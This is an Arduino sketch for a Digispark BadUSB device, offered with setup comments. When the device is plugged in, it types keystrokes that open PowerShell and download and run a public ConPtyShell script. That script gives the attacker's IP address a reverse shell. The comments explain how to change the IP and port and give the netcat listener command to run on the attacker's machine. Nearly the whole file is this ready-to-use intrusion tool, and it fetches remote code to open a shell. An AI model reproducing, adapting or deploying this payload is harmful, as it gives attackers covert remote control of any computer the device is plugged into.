// This script downloads and executes a powershell script efectively opening up a reverse shell in less than 30 seconds. 
// This script credits to Ethical Hacking youtube channel
// This script contains ip address of 172.17.45.102 , change it to the hackers ip
// 87 behind the ip is the port . You can change it to your desire in both the script here and the hackers opening port
// enter the above command as root user in linux ---  stty raw -echo; (stty size; cat) | nc -lvnp 87 -s 172.28.131.38  --- (-s here is ip ) behind -lvnp is the port 

#include "DigiKeyboard.h"
void setup() {
}

void loop() {

    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.print("powershell  -noe -c mode.com con: lines=10 cols=15");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.17.45.102 87");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}
